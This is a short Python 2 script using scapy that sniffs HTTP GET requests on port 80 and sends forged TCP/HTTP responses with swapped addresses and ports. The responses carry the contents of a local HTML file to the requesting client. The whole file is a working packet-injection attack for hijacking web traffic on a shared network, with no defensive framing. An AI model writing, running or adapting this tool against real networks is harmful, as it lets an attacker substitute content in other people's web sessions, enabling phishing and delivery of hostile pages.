import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # remove scapy warnings

from scapy.all import *
conf.verb = 0 # turn off scapy messages

import sys

path = 'my_page.html'
page = open(path, 'r') # open file containing html
html = page.read() # get html
default_value = 10

def start():
    print "Listening for http GET requests..."
    
    sniff(prn=inject,
          filter='tcp port 80', # http
          lfilter=lambda p: 'GET' in str(p) # is a GET request
    ) 

def inject(p): # got packet, inject my html
    response = forge_response(p)
    print 'Spoofed Response: ' + str(response[IP].src) + '->' + str(response[IP].dst)
    sendp(response) # send spoofed response
            
def forge_response(p):
    ether = Ether(src=p[Ether].dst, dst=p[Ether].src) # switch ethernet direction
    ip = IP(src=p[IP].dst, dst=p[IP].src) # switch direction of ip address
    tcp = TCP(sport=p[TCP].dport, dport=p[TCP].sport, seq=p[TCP].ack, ack=p[TCP].seq + 1, flags="AP") # switch direction of ports and send FIN
    
    # create http response
    response = "HTTP /1.1 200 OK\n"
    response += "Server: MyServer\n"
    response += "Content-Type: text/html\n"
    response += "Content-Length: " + str(len(html)) + "\n"
    response += "Connection: close"
    response += "\n\n"
    response += html
    
    my_packet = ether / ip / tcp / response # forge response packet with my html in it
    return my_packet
    
start()
